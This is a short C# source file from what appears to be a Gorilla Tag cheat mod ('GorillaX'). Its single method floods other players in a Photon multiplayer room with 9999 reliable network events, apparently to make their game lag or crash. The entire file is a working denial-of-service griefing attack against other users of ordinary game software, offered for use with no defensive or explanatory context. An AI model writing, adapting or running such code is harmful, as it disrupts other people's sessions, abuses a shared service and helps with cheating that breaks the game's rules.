using System;
using System.Text;
using System.Collections.Generic;
using UnityEngine;
using Photon.Pun;
using Photon.Realtime;
using ExitGames.Client.Photon;

namespace GorillaX.Mods 
{
  internal class Lagg 
  {
    public static void LagAllMod() 
    {
      for(int x = 0;x<9999;x++) 
      {
        PhotonNetwork.NetworkingClient.OpRaiseEvent(200, new object[] 
        {
          -357418518,
          76
        },
        new RaiseEventOptions 
        {
          CachingOption = EventCaching.DoNotCache,
          Receivers = ReceiverGroup.Others
        },
        SendOptions.SendReliable
        );
        PhotonNetwork.SendAllOutgoingCommands();
      }
    }
  }
}